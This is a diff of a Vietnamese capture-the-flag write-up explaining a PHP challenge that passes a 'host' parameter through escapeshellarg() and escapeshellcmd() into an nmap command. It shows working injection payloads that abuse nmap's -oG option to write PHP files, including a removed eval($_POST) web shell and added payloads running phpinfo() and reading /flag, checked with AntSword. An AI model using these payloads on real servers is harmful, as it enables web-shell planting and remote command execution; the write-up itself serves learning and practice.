@@ -21,11 +21,11 @@ if(!isset($_GET['host'])) {
 }
 ```
 
-Đầu tiên là `REMOTE_ADDR` và `X_FORWARDED_FOR` cũng ko quan trọng mấy.Ta có thể truyền tham số “host” thông qua method GET. Nếu tham số host có tồn tại thì nó sẽ được xử lí lần lượt qua 2 hàm `escapeshellarg()` và `escapeshellcmd()`.Đối với hàm `escapeshellarg` nó sẽ chuyển từ chuỗi thành tham số có thể sử dụng trong shell command, và bọc dấu ngoặc đơn để đảm bảo rằng các ký tự đặc biệt không được hiểu là phần của lệnh, mà chỉ được coi là phần chuỗi.
+Đầu tiên là `REMOTE_ADDR` và `X_FORWARDED_FOR` cũng ko quan trọng mấy.Ta có thể truyền tham số “host” thông qua method GET. Nếu tham số host có tồn tại thì nó sẽ được xử lí lần lượt qua 2 hàm `escapeshellarg()` và `escapeshellcmd()`.Đối với hàm `escapeshellarg()` trong PHP được sử dụng để bảo vệ các đối số được truyền vào cho một lệnh shell. Nó thực hiện việc xử lý các ký tự đặc biệt trong đối số để đảm bảo rằng chúng không được hiểu nhầm là các ký tự có ý nghĩa đặc biệt trong shell,và nó bọc dấu ngoặc đơn để đảm bảo rằng các ký tự đặc biệt không được hiểu là phần của lệnh, mà chỉ được coi là phần chuỗi.
 
 `escapeshellcmd` Đảm bảo rằng user chỉ thực hiện một command.Dấu “\” sẽ được thêm vào trước các kí tự & #; `| \? ~ <> ^ () [] {} $ *, \ X0A và \ xFF
 
-# Bypass
+Sau khi xử lí host qua 2 hàm trên, thì nó tạo một thư mục với tên là một mã băm MD5 của chuỗi "glzjin" và địa chỉ IP của người dùng ($_SERVER['REMOTE_ADDR']). Điều này có thể tạo ra một thư mục duy nhất cho mỗi người dùng.Sau đó chuyển `you are in sandbox` vào thư mục được tạo.Cuối cùng, sử dụng hàm system() để thực thi lệnh "nmap" với các tùy chọn. Lệnh này sẽ chạy công cụ quét mạng Nmap với các tùy chọn "-T5 -sT -Pn --host-timeout 2 -F" và địa chỉ IP hoặc tên miền đã được truyền qua biến $_GET['host']. Kết quả của lệnh được xuất ra trình duyệt.
 
 ![image](https://github.com/Llam-a/BUUCTF/assets/115911041/4c964fda-0b73-49b1-8969-07d3b48ad741)
 
@@ -36,7 +36,19 @@ Mình có đọc [wu](https://security.szurek.pl/en/exploit-bypass-php-escapeshe
 
 `nmap -T5 -sT -Pn --host-timeout 2 -F`
 
-Payload: `nmap -T5 -sT -Pn --host-timeout 2 -F '1'\\''shellcode\'`
+Viết một Trojan link
 
-shellcode: `'<?php eval($_POST["a"]);?> -oG hack.php '`
+`?host=' <?php echo phpinfo();?> -oG test.php '`
+
+![image](https://github.com/Llam-a/BUUCTF/assets/115911041/90600511-02cb-4825-b1ea-ce1ebb3a3d45)
+
+Mình sử dụng antsword để check xem nó có hoạt động ko
+
+![image](https://github.com/Llam-a/BUUCTF/assets/115911041/5b42520c-d23a-49b2-bd12-dd80bf25dc40)
+
+Mình tiếp tục inject, sử dụng option -oG của nmap để viết command và ouput vào 1 file.
+
+`?host=' <?php echo `cat /flag`;?> -oG test.php '"`
+
+![image](https://github.com/Llam-a/BUUCTF/assets/115911041/0f806814-75af-45c5-92d3-77a65e188bf0)
 
